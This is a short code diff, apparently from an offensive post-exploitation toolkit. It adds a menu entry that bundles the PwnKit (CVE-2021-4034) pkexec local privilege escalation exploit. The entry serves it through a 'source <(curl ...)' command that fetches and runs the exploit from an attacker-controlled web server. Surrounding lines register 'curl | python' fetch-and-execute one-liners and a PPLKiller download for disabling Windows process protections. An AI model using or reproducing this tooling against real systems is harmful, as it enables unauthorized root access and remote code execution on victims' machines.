@@ -490,6 +490,14 @@ pandora('c-1')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl + Python3')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python'), desc='curl + Python')
 
+# linux LPE
+with open(os.path.join(TempUtil.getTempDir(), 'llpe'), 'wb') as f:
+    f.write(ez_fit('scripts/cve-2021-4034/exp.sh', \
+        pwnkit=TempUtil.getFileUrl('scripts/cve-2021-4034/pwnkit.so'), \
+        trigger=TempUtil.getFileUrl('scripts/cve-2021-4034/trigger')
+    ))
+wlmgr.add('PolKit pkexec LPE', 'pkexec', 'source <(curl %(base)s/%(f)s)' %  dict(base=httpUrl, f='llpe'))
+
 pandora('ppl-1', Tvar=dict(pplkiller_dl=wlmgr.getCmd(desc1='[Simple] PPLKiller.exe')), useTransform=False, FILENAME='pk.ps1')
 
 if args.revport:
